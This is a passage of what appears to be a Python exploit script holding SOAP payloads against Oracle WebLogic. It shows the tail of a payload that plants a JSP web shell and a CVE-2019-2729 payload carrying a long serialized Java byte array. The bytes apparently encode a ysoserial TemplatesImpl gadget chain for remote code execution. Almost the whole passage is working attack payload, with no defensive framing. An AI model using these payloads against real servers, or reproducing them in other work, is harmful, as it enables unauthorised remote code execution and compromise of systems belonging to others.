            'nputStream();int a = -1;byte[] b = new byte[1024];out.print("<pre>");while((a=in.read(b))!=-1){out.prin' \
            'tln(new String(b));}out.print("</pre>");}%>]]></string></void><void method="close"/></object></java></w' \
            'ork:WorkContext></soapenv:Header><soapenv:Body><asy:onAsyncDelivery/></soapenv:Body></soapenv:Envelope>'

        self.payload_cve_2019_2729 = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/''' \
            '''" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">
               <soapenv:Header>
             <wsa:Action>xx</wsa:Action>
            <wsa:RelatesTo>xx</wsa:RelatesTo>
            <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java>
            <array method="forName"><string>oracle.toplink.internal.sessions.UnitOfWorkChangeSet</string><void>
            <array class="byte" length="5010"><void index="0"><byte>-84</byte></void>
            <void index="1"><byte>-19</byte></void>
            <void index="2"><byte>0</byte></void>
            <void index="3"><byte>5</byte></void>
            <void index="4"><byte>115</byte></void>
            <void index="5"><byte>114</byte></void>
            <void index="6"><byte>0</byte></void>
            <void index="7"><byte>23</byte></void>
            <void index="8"><byte>106</byte></void>
            <void index="9"><byte>97</byte></void>
            <void index="10"><byte>118</byte></void>
            <void index="11"><byte>97</byte></void>
            <void index="12"><byte>46</byte></void>
            <void index="13"><byte>117</byte></void>
            <void index="14"><byte>116</byte></void>
            <void index="15"><byte>105</byte></void>
            <void index="16"><byte>108</byte></void>
            <void index="17"><byte>46</byte></void>
            <void index="18"><byte>76</byte></void>
            <void index="19"><byte>105</byte></void>
            <void index="20"><byte>110</byte></void>
            <void index="21"><byte>107</byte></void>
            <void index="22"><byte>101</byte></void>
            <void index="23"><byte>100</byte></void>
            <void index="24"><byte>72</byte></void>
            <void index="25"><byte>97</byte></void>
            <void index="26"><byte>115</byte></void>
            <void index="27"><byte>104</byte></void>
            <void index="28"><byte>83</byte></void>
            <void index="29"><byte>101</byte></void>
            <void index="30"><byte>116</byte></void>
            <void index="31"><byte>-40</byte></void>
            <void index="32"><byte>108</byte></void>
            <void index="33"><byte>-41</byte></void>
            <void index="34"><byte>90</byte></void>
            <void index="35"><byte>-107</byte></void>
            <void index="36"><byte>-35</byte></void>
            <void index="37"><byte>42</byte></void>
            <void index="38"><byte>30</byte></void>
            <void index="39"><byte>2</byte></void>
            <void index="40"><byte>0</byte></void>
            <void index="41"><byte>0</byte></void>
            <void index="42"><byte>120</byte></void>
            <void index="43"><byte>114</byte></void>
            <void index="44"><byte>0</byte></void>
            <void index="45"><byte>17</byte></void>
            <void index="46"><byte>106</byte></void>
            <void index="47"><byte>97</byte></void>
            <void index="48"><byte>118</byte></void>
            <void index="49"><byte>97</byte></void>
            <void index="50"><byte>46</byte></void>
            <void index="51"><byte>117</byte></void>
            <void index="52"><byte>116</byte></void>
            <void index="53"><byte>105</byte></void>
            <void index="54"><byte>108</byte></void>
            <void index="55"><byte>46</byte></void>
            <void index="56"><byte>72</byte></void>
            <void index="57"><byte>97</byte></void>
            <void index="58"><byte>115</byte></void>
            <void index="59"><byte>104</byte></void>
            <void index="60"><byte>83</byte></void>
            <void index="61"><byte>101</byte></void>
            <void index="62"><byte>116</byte></void>
            <void index="63"><byte>-70</byte></void>
            <void index="64"><byte>68</byte></void>
            <void index="65"><byte>-123</byte></void>
            <void index="66"><byte>-107</byte></void>
            <void index="67"><byte>-106</byte></void>
            <void index="68"><byte>-72</byte></void>
            <void index="69"><byte>-73</byte></void>
            <void index="70"><byte>52</byte></void>
            <void index="71"><byte>3</byte></void>
            <void index="72"><byte>0</byte></void>
            <void index="73"><byte>0</byte></void>
            <void index="74"><byte>120</byte></void>
            <void index="75"><byte>112</byte></void>
            <void index="76"><byte>119</byte></void>
            <void index="77"><byte>12</byte></void>
            <void index="78"><byte>0</byte></void>
            <void index="79"><byte>0</byte></void>
            <void index="80"><byte>0</byte></void>
            <void index="81"><byte>16</byte></void>
            <void index="82"><byte>63</byte></void>
            <void index="83"><byte>64</byte></void>
            <void index="84"><byte>0</byte></void>
            <void index="85"><byte>0</byte></void>
            <void index="86"><byte>0</byte></void>
            <void index="87"><byte>0</byte></void>
            <void index="88"><byte>0</byte></void>
            <void index="89"><byte>2</byte></void>
            <void index="90"><byte>115</byte></void>
            <void index="91"><byte>114</byte></void>
            <void index="92"><byte>0</byte></void>
            <void index="93"><byte>58</byte></void>
            <void index="94"><byte>99</byte></void>
            <void index="95"><byte>111</byte></void>
            <void index="96"><byte>109</byte></void>
            <void index="97"><byte>46</byte></void>
            <void index="98"><byte>115</byte></void>
            <void index="99"><byte>117</byte></void>
            <void index="100"><byte>110</byte></void>
            <void index="101"><byte>46</byte></void>
            <void index="102"><byte>111</byte></void>
            <void index="103"><byte>114</byte></void>
            <void index="104"><byte>103</byte></void>
            <void index="105"><byte>46</byte></void>
            <void index="106"><byte>97</byte></void>
            <void index="107"><byte>112</byte></void>
            <void index="108"><byte>97</byte></void>
            <void index="109"><byte>99</byte></void>
            <void index="110"><byte>104</byte></void>
            <void index="111"><byte>101</byte></void>
            <void index="112"><byte>46</byte></void>
            <void index="113"><byte>120</byte></void>
            <void index="114"><byte>97</byte></void>
            <void index="115"><byte>108</byte></void>
            <void index="116"><byte>97</byte></void>
            <void index="117"><byte>110</byte></void>
            <void index="118"><byte>46</byte></void>
            <void index="119"><byte>105</byte></void>
            <void index="120"><byte>110</byte></void>
            <void index="121"><byte>116</byte></void>
            <void index="122"><byte>101</byte></void>
            <void index="123"><byte>114</byte></void>
            <void index="124"><byte>110</byte></void>
            <void index="125"><byte>97</byte></void>
            <void index="126"><byte>108</byte></void>
            <void index="127"><byte>46</byte></void>
            <void index="128"><byte>120</byte></void>
            <void index="129"><byte>115</byte></void>
            <void index="130"><byte>108</byte></void>
            <void index="131"><byte>116</byte></void>
            <void index="132"><byte>99</byte></void>
            <void index="133"><byte>46</byte></void>
            <void index="134"><byte>116</byte></void>
            <void index="135"><byte>114</byte></void>
            <void index="136"><byte>97</byte></void>
            <void index="137"><byte>120</byte></void>
            <void index="138"><byte>46</byte></void>
            <void index="139"><byte>84</byte></void>
            <void index="140"><byte>101</byte></void>
            <void index="141"><byte>109</byte></void>
            <void index="142"><byte>112</byte></void>
            <void index="143"><byte>108</byte></void>
            <void index="144"><byte>97</byte></void>
            <void index="145"><byte>116</byte></void>
            <void index="146"><byte>101</byte></void>
            <void index="147"><byte>115</byte></void>
            <void index="148"><byte>73</byte></void>
            <void index="149"><byte>109</byte></void>
            <void index="150"><byte>112</byte></void>
            <void index="151"><byte>108</byte></void>
            <void index="152"><byte>9</byte></void>
            <void index="153"><byte>87</byte></void>
            <void index="154"><byte>79</byte></void>
            <void index="155"><byte>-63</byte></void>
            <void index="156"><byte>110</byte></void>
            <void index="157"><byte>-84</byte></void>
            <void index="158"><byte>-85</byte></void>
            <void index="159"><byte>51</byte></void>
            <void index="160"><byte>3</byte></void>
            <void index="161"><byte>0</byte></void>
            <void index="162"><byte>9</byte></void>
            <void index="163"><byte>73</byte></void>
            <void index="164"><byte>0</byte></void>
            <void index="165"><byte>13</byte></void>
            <void index="166"><byte>95</byte></void>
            <void index="167"><byte>105</byte></void>
            <void index="168"><byte>110</byte></void>
            <void index="169"><byte>100</byte></void>
            <void index="170"><byte>101</byte></void>
            <void index="171"><byte>110</byte></void>
            <void index="172"><byte>116</byte></void>
            <void index="173"><byte>78</byte></void>
            <void index="174"><byte>117</byte></void>
            <void index="175"><byte>109</byte></void>
            <void index="176"><byte>98</byte></void>
            <void index="177"><byte>101</byte></void>
            <void index="178"><byte>114</byte></void>
            <void index="179"><byte>73</byte></void>
            <void index="180"><byte>0</byte></void>
            <void index="181"><byte>14</byte></void>
            <void index="182"><byte>95</byte></void>
            <void index="183"><byte>116</byte></void>
            <void index="184"><byte>114</byte></void>
            <void index="185"><byte>97</byte></void>
            <void index="186"><byte>110</byte></void>
            <void index="187"><byte>115</byte></void>
            <void index="188"><byte>108</byte></void>
            <void index="189"><byte>101</byte></void>
            <void index="190"><byte>116</byte></void>
            <void index="191"><byte>73</byte></void>
            <void index="192"><byte>110</byte></void>
            <void index="193"><byte>100</byte></void>
            <void index="194"><byte>101</byte></void>
            <void index="195"><byte>120</byte></void>
            <void index="196"><byte>90</byte></void>
            <void index="197"><byte>0</byte></void>
            <void index="198"><byte>21</byte></void>
            <void index="199"><byte>95</byte></void>
            <void index="200"><byte>117</byte></void>
            <void index="201"><byte>115</byte></void>
            <void index="202"><byte>101</byte></void>
            <void index="203"><byte>83</byte></void>
            <void index="204"><byte>101</byte></void>
            <void index="205"><byte>114</byte></void>
            <void index="206"><byte>118</byte></void>
            <void index="207"><byte>105</byte></void>
            <void index="208"><byte>99</byte></void>
            <void index="209"><byte>101</byte></void>
            <void index="210"><byte>115</byte></void>
            <void index="211"><byte>77</byte></void>
            <void index="212"><byte>101</byte></void>
            <void index="213"><byte>99</byte></void>
            <void index="214"><byte>104</byte></void>
            <void index="215"><byte>97</byte></void>
            <void index="216"><byte>110</byte></void>
            <void index="217"><byte>105</byte></void>
            <void index="218"><byte>115</byte></void>
            <void index="219"><byte>109</byte></void>
            <void index="220"><byte>76</byte></void>
            <void index="221"><byte>0</byte></void>
            <void index="222"><byte>25</byte></void>
            <void index="223"><byte>95</byte></void>
            <void index="224"><byte>97</byte></void>
            <void index="225"><byte>99</byte></void>
            <void index="226"><byte>99</byte></void>
            <void index="227"><byte>101</byte></void>
            <void index="228"><byte>115</byte></void>
            <void index="229"><byte>115</byte></void>
            <void index="230"><byte>69</byte></void>
            <void index="231"><byte>120</byte></void>
            <void index="232"><byte>116</byte></void>
            <void index="233"><byte>101</byte></void>
            <void index="234"><byte>114</byte></void>
            <void index="235"><byte>110</byte></void>
            <void index="236"><byte>97</byte></void>
            <void index="237"><byte>108</byte></void>
            <void index="238"><byte>83</byte></void>
            <void index="239"><byte>116</byte></void>
            <void index="240"><byte>121</byte></void>
            <void index="241"><byte>108</byte></void>
            <void index="242"><byte>101</byte></void>
            <void index="243"><byte>115</byte></void>
            <void index="244"><byte>104</byte></void>
            <void index="245"><byte>101</byte></void>
            <void index="246"><byte>101</byte></void>
            <void index="247"><byte>116</byte></void>
            <void index="248"><byte>116</byte></void>
            <void index="249"><byte>0</byte></void>
            <void index="250"><byte>18</byte></void>
            <void index="251"><byte>76</byte></void>
            <void index="252"><byte>106</byte></void>
            <void index="253"><byte>97</byte></void>
            <void index="254"><byte>118</byte></void>
            <void index="255"><byte>97</byte></void>
            <void index="256"><byte>47</byte></void>
            <void index="257"><byte>108</byte></void>
            <void index="258"><byte>97</byte></void>
            <void index="259"><byte>110</byte></void>
            <void index="260"><byte>103</byte></void>
            <void index="261"><byte>47</byte></void>
            <void index="262"><byte>83</byte></void>
            <void index="263"><byte>116</byte></void>
            <void index="264"><byte>114</byte></void>
            <void index="265"><byte>105</byte></void>
            <void index="266"><byte>110</byte></void>
            <void index="267"><byte>103</byte></void>
            <void index="268"><byte>59</byte></void>
            <void index="269"><byte>76</byte></void>
            <void index="270"><byte>0</byte></void>
            <void index="271"><byte>11</byte></void>
            <void index="272"><byte>95</byte></void>
            <void index="273"><byte>97</byte></void>
            <void index="274"><byte>117</byte></void>
            <void index="275"><byte>120</byte></void>
            <void index="276"><byte>67</byte></void>
            <void index="277"><byte>108</byte></void>
            <void index="278"><byte>97</byte></void>
            <void index="279"><byte>115</byte></void>
            <void index="280"><byte>115</byte></void>
            <void index="281"><byte>101</byte></void>
            <void index="282"><byte>115</byte></void>
            <void index="283"><byte>116</byte></void>
            <void index="284"><byte>0</byte></void>
            <void index="285"><byte>59</byte></void>
            <void index="286"><byte>76</byte></void>
            <void index="287"><byte>99</byte></void>
            <void index="288"><byte>111</byte></void>
            <void index="289"><byte>109</byte></void>
            <void index="290"><byte>47</byte></void>
            <void index="291"><byte>115</byte></void>
            <void index="292"><byte>117</byte></void>
            <void index="293"><byte>110</byte></void>
            <void index="294"><byte>47</byte></void>
            <void index="295"><byte>111</byte></void>
            <void index="296"><byte>114</byte></void>
            <void index="297"><byte>103</byte></void>
            <void index="298"><byte>47</byte></void>
            <void index="299"><byte>97</byte></void>
            <void index="300"><byte>112</byte></void>
            <void index="301"><byte>97</byte></void>
            <void index="302"><byte>99</byte></void>
            <void index="303"><byte>104</byte></void>
            <void index="304"><byte>101</byte></void>
            <void index="305"><byte>47</byte></void>
            <void index="306"><byte>120</byte></void>
            <void index="307"><byte>97</byte></void>
            <void index="308"><byte>108</byte></void>
            <void index="309"><byte>97</byte></void>
            <void index="310"><byte>110</byte></void>
            <void index="311"><byte>47</byte></void>
            <void index="312"><byte>105</byte></void>
            <void index="313"><byte>110</byte></void>
            <void index="314"><byte>116</byte></void>
            <void index="315"><byte>101</byte></void>
            <void index="316"><byte>114</byte></void>
            <void index="317"><byte>110</byte></void>
            <void index="318"><byte>97</byte></void>
            <void index="319"><byte>108</byte></void>
            <void index="320"><byte>47</byte></void>
            <void index="321"><byte>120</byte></void>
            <void index="322"><byte>115</byte></void>
            <void index="323"><byte>108</byte></void>
            <void index="324"><byte>116</byte></void>
            <void index="325"><byte>99</byte></void>
            <void index="326"><byte>47</byte></void>
            <void index="327"><byte>114</byte></void>
            <void index="328"><byte>117</byte></void>
            <void index="329"><byte>110</byte></void>
            <void index="330"><byte>116</byte></void>
            <void index="331"><byte>105</byte></void>
            <void index="332"><byte>109</byte></void>
            <void index="333"><byte>101</byte></void>
            <void index="334"><byte>47</byte></void>
            <void index="335"><byte>72</byte></void>
            <void index="336"><byte>97</byte></void>
            <void index="337"><byte>115</byte></void>
            <void index="338"><byte>104</byte></void>
            <void index="339"><byte>116</byte></void>
            <void index="340"><byte>97</byte></void>
            <void index="341"><byte>98</byte></void>
            <void index="342"><byte>108</byte></void>
            <void index="343"><byte>101</byte></void>
            <void index="344"><byte>59</byte></void>
            <void index="345"><byte>91</byte></void>
            <void index="346"><byte>0</byte></void>
            <void index="347"><byte>10</byte></void>
            <void index="348"><byte>95</byte></void>
            <void index="349"><byte>98</byte></void>
            <void index="350"><byte>121</byte></void>
            <void index="351"><byte>116</byte></void>
            <void index="352"><byte>101</byte></void>
            <void index="353"><byte>99</byte></void>
            <void index="354"><byte>111</byte></void>
            <void index="355"><byte>100</byte></void>
            <void index="356"><byte>101</byte></void>
            <void index="357"><byte>115</byte></void>
            <void index="358"><byte>116</byte></void>
            <void index="359"><byte>0</byte></void>
            <void index="360"><byte>3</byte></void>
            <void index="361"><byte>91</byte></void>
            <void index="362"><byte>91</byte></void>
            <void index="363"><byte>66</byte></void>
            <void index="364"><byte>91</byte></void>
            <void index="365"><byte>0</byte></void>
            <void index="366"><byte>6</byte></void>
            <void index="367"><byte>95</byte></void>
            <void index="368"><byte>99</byte></void>
            <void index="369"><byte>108</byte></void>
            <void index="370"><byte>97</byte></void>
            <void index="371"><byte>115</byte></void>
            <void index="372"><byte>115</byte></void>
            <void index="373"><byte>116</byte></void>
            <void index="374"><byte>0</byte></void>
            <void index="375"><byte>18</byte></void>
            <void index="376"><byte>91</byte></void>
            <void index="377"><byte>76</byte></void>
            <void index="378"><byte>106</byte></void>
            <void index="379"><byte>97</byte></void>
            <void index="380"><byte>118</byte></void>
            <void index="381"><byte>97</byte></void>
            <void index="382"><byte>47</byte></void>
            <void index="383"><byte>108</byte></void>
            <void index="384"><byte>97</byte></void>
            <void index="385"><byte>110</byte></void>
            <void index="386"><byte>103</byte></void>
            <void index="387"><byte>47</byte></void>
            <void index="388"><byte>67</byte></void>
            <void index="389"><byte>108</byte></void>
            <void index="390"><byte>97</byte></void>
            <void index="391"><byte>115</byte></void>
            <void index="392"><byte>115</byte></void>
            <void index="393"><byte>59</byte></void>
            <void index="394"><byte>76</byte></void>
            <void index="395"><byte>0</byte></void>
            <void index="396"><byte>5</byte></void>
            <void index="397"><byte>95</byte></void>
            <void index="398"><byte>110</byte></void>
            <void index="399"><byte>97</byte></void>
            <void index="400"><byte>109</byte></void>
            <void index="401"><byte>101</byte></void>
            <void index="402"><byte>113</byte></void>
            <void index="403"><byte>0</byte></void>
            <void index="404"><byte>126</byte></void>
            <void index="405"><byte>0</byte></void>
            <void index="406"><byte>4</byte></void>
            <void index="407"><byte>76</byte></void>
            <void index="408"><byte>0</byte></void>
            <void index="409"><byte>17</byte></void>
            <void index="410"><byte>95</byte></void>
            <void index="411"><byte>111</byte></void>
            <void index="412"><byte>117</byte></void>
            <void index="413"><byte>116</byte></void>
            <void index="414"><byte>112</byte></void>
            <void index="415"><byte>117</byte></void>
            <void index="416"><byte>116</byte></void>
            <void index="417"><byte>80</byte></void>
            <void index="418"><byte>114</byte></void>
            <void index="419"><byte>111</byte></void>
            <void index="420"><byte>112</byte></void>
            <void index="421"><byte>101</byte></void>
            <void index="422"><byte>114</byte></void>
            <void index="423"><byte>116</byte></void>
            <void index="424"><byte>105</byte></void>
            <void index="425"><byte>101</byte></void>
            <void index="426"><byte>115</byte></void>
            <void index="427"><byte>116</byte></void>
            <void index="428"><byte>0</byte></void>
            <void index="429"><byte>22</byte></void>
            <void index="430"><byte>76</byte></void>
            <void index="431"><byte>106</byte></void>
            <void index="432"><byte>97</byte></void>
            <void index="433"><byte>118</byte></void>
            <void index="434"><byte>97</byte></void>
            <void index="435"><byte>47</byte></void>
            <void index="436"><byte>117</byte></void>
            <void index="437"><byte>116</byte></void>
            <void index="438"><byte>105</byte></void>
            <void index="439"><byte>108</byte></void>
            <void index="440"><byte>47</byte></void>
            <void index="441"><byte>80</byte></void>
            <void index="442"><byte>114</byte></void>
            <void index="443"><byte>111</byte></void>
            <void index="444"><byte>112</byte></void>
            <void index="445"><byte>101</byte></void>
            <void index="446"><byte>114</byte></void>
            <void index="447"><byte>116</byte></void>
            <void index="448"><byte>105</byte></void>
            <void index="449"><byte>101</byte></void>
            <void index="450"><byte>115</byte></void>
            <void index="451"><byte>59</byte></void>
            <void index="452"><byte>120</byte></void>
            <void index="453"><byte>112</byte></void>
            <void index="454"><byte>0</byte></void>
            <void index="455"><byte>0</byte></void>
            <void index="456"><byte>0</byte></void>
            <void index="457"><byte>0</byte></void>
            <void index="458"><byte>-1</byte></void>
            <void index="459"><byte>-1</byte></void>
            <void index="460"><byte>-1</byte></void>
            <void index="461"><byte>-1</byte></void>
            <void index="462"><byte>0</byte></void>
            <void index="463"><byte>116</byte></void>
            <void index="464"><byte>0</byte></void>
            <void index="465"><byte>3</byte></void>
            <void index="466"><byte>97</byte></void>
            <void index="467"><byte>108</byte></void>
            <void index="468"><byte>108</byte></void>
            <void index="469"><byte>112</byte></void>
            <void index="470"><byte>117</byte></void>
            <void index="471"><byte>114</byte></void>
            <void index="472"><byte>0</byte></void>
            <void index="473"><byte>3</byte></void>
            <void index="474"><byte>91</byte></void>
            <void index="475"><byte>91</byte></void>
            <void index="476"><byte>66</byte></void>
            <void index="477"><byte>75</byte></void>
            <void index="478"><byte>-3</byte></void>
            <void index="479"><byte>25</byte></void>
            <void index="480"><byte>21</byte></void>
            <void index="481"><byte>103</byte></void>
            <void index="482"><byte>103</byte></void>
            <void index="483"><byte>-37</byte></void>
            <void index="484"><byte>55</byte></void>
            <void index="485"><byte>2</byte></void>
            <void index="486"><byte>0</byte></void>
            <void index="487"><byte>0</byte></void>
            <void index="488"><byte>120</byte></void>
            <void index="489"><byte>112</byte></void>
            <void index="490"><byte>0</byte></void>
            <void index="491"><byte>0</byte></void>
            <void index="492"><byte>0</byte></void>
            <void index="493"><byte>2</byte></void>
            <void index="494"><byte>117</byte></void>
            <void index="495"><byte>114</byte></void>
            <void index="496"><byte>0</byte></void>
            <void index="497"><byte>2</byte></void>
            <void index="498"><byte>91</byte></void>
            <void index="499"><byte>66</byte></void>
            <void index="500"><byte>-84</byte></void>
            <void index="501"><byte>-13</byte></void>
            <void index="502"><byte>23</byte></void>
            <void index="503"><byte>-8</byte></void>
            <void index="504"><byte>6</byte></void>
            <void index="505"><byte>8</byte></void>
            <void index="506"><byte>84</byte></void>
            <void index="507"><byte>-32</byte></void>
            <void index="508"><byte>2</byte></void>
            <void index="509"><byte>0</byte></void>
            <void index="510"><byte>0</byte></void>
            <void index="511"><byte>120</byte></void>
            <void index="512"><byte>112</byte></void>
            <void index="513"><byte>0</byte></void>
            <void index="514"><byte>0</byte></void>
            <void index="515"><byte>14</byte></void>
            <void index="516"><byte>29</byte></void>
            <void index="517"><byte>-54</byte></void>
            <void index="518"><byte>-2</byte></void>
            <void index="519"><byte>-70</byte></void>
            <void index="520"><byte>-66</byte></void>
            <void index="521"><byte>0</byte></void>
            <void index="522"><byte>0</byte></void>
            <void index="523"><byte>0</byte></void>
            <void index="524"><byte>50</byte></void>
            <void index="525"><byte>0</byte></void>
            <void index="526"><byte>-70</byte></void>
            <void index="527"><byte>10</byte></void>
            <void index="528"><byte>0</byte></void>
            <void index="529"><byte>3</byte></void>
            <void index="530"><byte>0</byte></void>
            <void index="531"><byte>34</byte></void>
            <void index="532"><byte>7</byte></void>
            <void index="533"><byte>0</byte></void>
            <void index="534"><byte>-72</byte></void>
            <void index="535"><byte>7</byte></void>
            <void index="536"><byte>0</byte></void>
            <void index="537"><byte>37</byte></void>
            <void index="538"><byte>7</byte></void>
            <void index="539"><byte>0</byte></void>
            <void index="540"><byte>38</byte></void>
            <void index="541"><byte>1</byte></void>
            <void index="542"><byte>0</byte></void>
            <void index="543"><byte>16</byte></void>
            <void index="544"><byte>115</byte></void>
            <void index="545"><byte>101</byte></void>
            <void index="546"><byte>114</byte></void>
            <void index="547"><byte>105</byte></void>
            <void index="548"><byte>97</byte></void>
            <void index="549"><byte>108</byte></void>
            <void index="550"><byte>86</byte></void>
            <void index="551"><byte>101</byte></void>
            <void index="552"><byte>114</byte></void>
            <void index="553"><byte>115</byte></void>
            <void index="554"><byte>105</byte></void>
            <void index="555"><byte>111</byte></void>
            <void index="556"><byte>110</byte></void>
            <void index="557"><byte>85</byte></void>
            <void index="558"><byte>73</byte></void>
            <void index="559"><byte>68</byte></void>
            <void index="560"><byte>1</byte></void>
            <void index="561"><byte>0</byte></void>
            <void index="562"><byte>1</byte></void>
            <void index="563"><byte>74</byte></void>
            <void index="564"><byte>1</byte></void>
            <void index="565"><byte>0</byte></void>
            <void index="566"><byte>13</byte></void>
            <void index="567"><byte>67</byte></void>
            <void index="568"><byte>111</byte></void>
            <void index="569"><byte>110</byte></void>
            <void index="570"><byte>115</byte></void>
            <void index="571"><byte>116</byte></void>
            <void index="572"><byte>97</byte></void>
            <void index="573"><byte>110</byte></void>
            <void index="574"><byte>116</byte></void>
            <void index="575"><byte>86</byte></void>
            <void index="576"><byte>97</byte></void>
            <void index="577"><byte>108</byte></void>
            <void index="578"><byte>117</byte></void>
            <void index="579"><byte>101</byte></void>
            <void index="580"><byte>5</byte></void>
            <void index="581"><byte>-83</byte></void>
            <void index="582"><byte>32</byte></void>
            <void index="583"><byte>-109</byte></void>
            <void index="584"><byte>-13</byte></void>
            <void index="585"><byte>-111</byte></void>
            <void index="586"><byte>-35</byte></void>
            <void index="587"><byte>-17</byte></void>
            <void index="588"><byte>62</byte></void>
            <void index="589"><byte>1</byte></void>
            <void index="590"><byte>0</byte></void>
            <void index="591"><byte>6</byte></void>
            <void index="592"><byte>60</byte></void>
            <void index="593"><byte>105</byte></void>
            <void index="594"><byte>110</byte></void>
            <void index="595"><byte>105</byte></void>
            <void index="596"><byte>116</byte></void>
            <void index="597"><byte>62</byte></void>
            <void index="598"><byte>1</byte></void>
            <void index="599"><byte>0</byte></void>
            <void index="600"><byte>3</byte></void>
            <void index="601"><byte>40</byte></void>
            <void index="602"><byte>41</byte></void>
            <void index="603"><byte>86</byte></void>
            <void index="604"><byte>1</byte></void>
            <void index="605"><byte>0</byte></void>
            <void index="606"><byte>4</byte></void>
            <void index="607"><byte>67</byte></void>
            <void index="608"><byte>111</byte></void>
            <void index="609"><byte>100</byte></void>
            <void index="610"><byte>101</byte></void>
            <void index="611"><byte>1</byte></void>
            <void index="612"><byte>0</byte></void>
            <void index="613"><byte>15</byte></void>
            <void index="614"><byte>76</byte></void>
            <void index="615"><byte>105</byte></void>
            <void index="616"><byte>110</byte></void>
            <void index="617"><byte>101</byte></void>
            <void index="618"><byte>78</byte></void>
            <void index="619"><byte>117</byte></void>
            <void index="620"><byte>109</byte></void>
            <void index="621"><byte>98</byte></void>
            <void index="622"><byte>101</byte></void>
            <void index="623"><byte>114</byte></void>
            <void index="624"><byte>84</byte></void>
            <void index="625"><byte>97</byte></void>
            <void index="626"><byte>98</byte></void>
            <void index="627"><byte>108</byte></void>
            <void index="628"><byte>101</byte></void>
            <void index="629"><byte>1</byte></void>
            <void index="630"><byte>0</byte></void>
            <void index="631"><byte>18</byte></void>
            <void index="632"><byte>76</byte></void>
            <void index="633"><byte>111</byte></void>
            <void index="634"><byte>99</byte></void>
            <void index="635"><byte>97</byte></void>
            <void index="636"><byte>108</byte></void>
            <void index="637"><byte>86</byte></void>
            <void index="638"><byte>97</byte></void>
            <void index="639"><byte>114</byte></void>
            <void index="640"><byte>105</byte></void>
            <void index="641"><byte>97</byte></void>
            <void index="642"><byte>98</byte></void>
            <void index="643"><byte>108</byte></void>
            <void index="644"><byte>101</byte></void>
            <void index="645"><byte>84</byte></void>
            <void index="646"><byte>97</byte></void>
            <void index="647"><byte>98</byte></void>
            <void index="648"><byte>108</byte></void>
            <void index="649"><byte>101</byte></void>
            <void index="650"><byte>1</byte></void>
            <void index="651"><byte>0</byte></void>
            <void index="652"><byte>4</byte></void>
            <void index="653"><byte>116</byte></void>
            <void index="654"><byte>104</byte></void>
            <void index="655"><byte>105</byte></void>
            <void index="656"><byte>115</byte></void>
            <void index="657"><byte>1</byte></void>
            <void index="658"><byte>0</byte></void>
            <void index="659"><byte>19</byte></void>
            <void index="660"><byte>83</byte></void>
            <void index="661"><byte>116</byte></void>
            <void index="662"><byte>117</byte></void>
            <void index="663"><byte>98</byte></void>
            <void index="664"><byte>84</byte></void>
            <void index="665"><byte>114</byte></void>
            <void index="666"><byte>97</byte></void>
            <void index="667"><byte>110</byte></void>
            <void index="668"><byte>115</byte></void>
            <void index="669"><byte>108</byte></void>
            <void index="670"><byte>101</byte></void>
            <void index="671"><byte>116</byte></void>
            <void index="672"><byte>80</byte></void>
            <void index="673"><byte>97</byte></void>
            <void index="674"><byte>121</byte></void>
            <void index="675"><byte>108</byte></void>
            <void index="676"><byte>111</byte></void>
            <void index="677"><byte>97</byte></void>
            <void index="678"><byte>100</byte></void>
            <void index="679"><byte>1</byte></void>
            <void index="680"><byte>0</byte></void>
            <void index="681"><byte>12</byte></void>
            <void index="682"><byte>73</byte></void>
            <void index="683"><byte>110</byte></void>
            <void index="684"><byte>110</byte></void>
            <void index="685"><byte>101</byte></void>
            <void index="686"><byte>114</byte></void>
            <void index="687"><byte>67</byte></void>
            <void index="688"><byte>108</byte></void>
            <void index="689"><byte>97</byte></void>
            <void index="690"><byte>115</byte></void>
            <void index="691"><byte>115</byte></void>
            <void index="692"><byte>101</byte></void>
            <void index="693"><byte>115</byte></void>
            <void index="694"><byte>1</byte></void>
            <void index="695"><byte>0</byte></void>
            <void index="696"><byte>53</byte></void>
            <void index="697"><byte>76</byte></void>
            <void index="698"><byte>121</byte></void>
            <void index="699"><byte>115</byte></void>
            <void index="700"><byte>111</byte></void>
            <void index="701"><byte>115</byte></void>
            <void index="702"><byte>101</byte></void>
            <void index="703"><byte>114</byte></void>
            <void index="704"><byte>105</byte></void>
            <void index="705"><byte>97</byte></void>
            <void index="706"><byte>108</byte></void>
            <void index="707"><byte>47</byte></void>
            <void index="708"><byte>112</byte></void>
            <void index="709"><byte>97</byte></void>
            <void index="710"><byte>121</byte></void>
            <void index="711"><byte>108</byte></void>
            <void index="712"><byte>111</byte></void>
            <void index="713"><byte>97</byte></void>
            <void index="714"><byte>100</byte></void>
            <void index="715"><byte>115</byte></void>
            <void index="716"><byte>47</byte></void>
            <void index="717"><byte>117</byte></void>
            <void index="718"><byte>116</byte></void>
            <void index="719"><byte>105</byte></void>
            <void index="720"><byte>108</byte></void>
            <void index="721"><byte>47</byte></void>
            <void index="722"><byte>71</byte></void>
            <void index="723"><byte>97</byte></void>
            <void index="724"><byte>100</byte></void>
            <void index="725"><byte>103</byte></void>
            <void index="726"><byte>101</byte></void>
            <void index="727"><byte>116</byte></void>
            <void index="728"><byte>115</byte></void>
            <void index="729"><byte>36</byte></void>
            <void index="730"><byte>83</byte></void>
            <void index="731"><byte>116</byte></void>
            <void index="732"><byte>117</byte></void>
            <void index="733"><byte>98</byte></void>
            <void index="734"><byte>84</byte></void>
            <void index="735"><byte>114</byte></void>
            <void index="736"><byte>97</byte></void>
            <void index="737"><byte>110</byte></void>
            <void index="738"><byte>115</byte></void>
            <void index="739"><byte>108</byte></void>
            <void index="740"><byte>101</byte></void>
            <void index="741"><byte>116</byte></void>
            <void index="742"><byte>80</byte></void>
            <void index="743"><byte>97</byte></void>
            <void index="744"><byte>121</byte></void>
            <void index="745"><byte>108</byte></void>
            <void index="746"><byte>111</byte></void>
            <void index="747"><byte>97</byte></void>
            <void index="748"><byte>100</byte></void>
            <void index="749"><byte>59</byte></void>
            <void index="750"><byte>1</byte></void>
            <void index="751"><byte>0</byte></void>
            <void index="752"><byte>9</byte></void>
            <void index="753"><byte>116</byte></void>
            <void index="754"><byte>114</byte></void>
            <void index="755"><byte>97</byte></void>
            <void index="756"><byte>110</byte></void>
            <void index="757"><byte>115</byte></void>
            <void index="758"><byte>102</byte></void>
            <void index="759"><byte>111</byte></void>
            <void index="760"><byte>114</byte></void>
            <void index="761"><byte>109</byte></void>
            <void index="762"><byte>1</byte></void>
            <void index="763"><byte>0</byte></void>
